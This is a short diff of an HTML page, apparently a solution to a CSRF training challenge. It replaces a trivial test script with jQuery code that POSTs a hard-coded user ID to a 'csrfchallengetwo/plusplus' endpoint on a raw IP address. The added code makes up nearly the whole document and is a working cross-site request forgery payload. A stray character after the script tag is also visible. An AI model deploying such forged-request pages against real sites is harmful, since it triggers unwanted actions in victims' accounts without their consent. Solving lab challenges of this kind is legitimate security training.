@@ -1,8 +1,20 @@
 <html>
 <head>
-<script type="text/javascript">
+<script
+  src="https://code.jquery.com/jquery-3.2.1.js"
+    integrity="sha256-DZAnKJ/6XZ9si04Hgrsxu/8s717jcIzLy3oi35EouyE="
+	  crossorigin="anonymous"></script>
+
+<script type="text/javascript">i
+b = 'https://173.228.153.245/';
+strawsid='6cac9ea15d24575a47e265b14f9b1479dba9e66e';
+strawzid='f0f0d81eef7f607cec222f01714ad6f09e3cb507';
 function calljs(){
-     document.write("ok" + $ == jQuery);
+    $.post({
+		url:b + 'user/csrfchallengetwo/plusplus',
+		data: 'userId='+strawsid,
+		success: function(r){console.log(r)}
+		});
 }
 </script>
 
